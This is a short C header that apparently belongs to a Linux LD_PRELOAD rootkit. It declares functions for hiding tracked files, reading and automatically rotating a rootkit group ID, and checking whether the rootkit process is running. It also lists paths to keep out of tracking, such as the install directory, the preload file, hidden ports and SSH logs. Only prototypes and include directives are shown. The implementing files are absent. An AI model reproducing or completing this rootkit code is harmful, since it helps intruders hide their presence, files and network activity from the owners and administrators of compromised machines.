#ifndef _GID_H_
#define _GID_H_

#ifdef HIDE_MY_ASS
int pathtracked(const char *pathname);
void trackwrite(const char *pathname);
void hidemyass(void);

/* don't try to track the following for w/e reason */
static char *const nopetrack[8] = {"/proc", GID_PATH, INSTALL_DIR,
                                   PRELOAD_FILE, GIDTIME_PATH, HIDEPORTS,
                                   SSH_LOGS, INTEREST_DIR};
#endif

#ifdef READ_GID_FROM_FILE
gid_t changerkgid(void);
#include "change.c"
#endif


gid_t readgid(void);
#include "readgid.c"
#ifdef HIDE_MY_ASS
#include "myass.c"
#endif

#ifdef AUTO_GID_CHANGER
int rkprocup(void);
FILE *opengidtimepath(const char *mode);
int getlastchange(void);
void writelastchange(int curtime);
int getlastchangediff(int curtime);
void gidchanger(void);
#include "auto.c"
#endif

#endif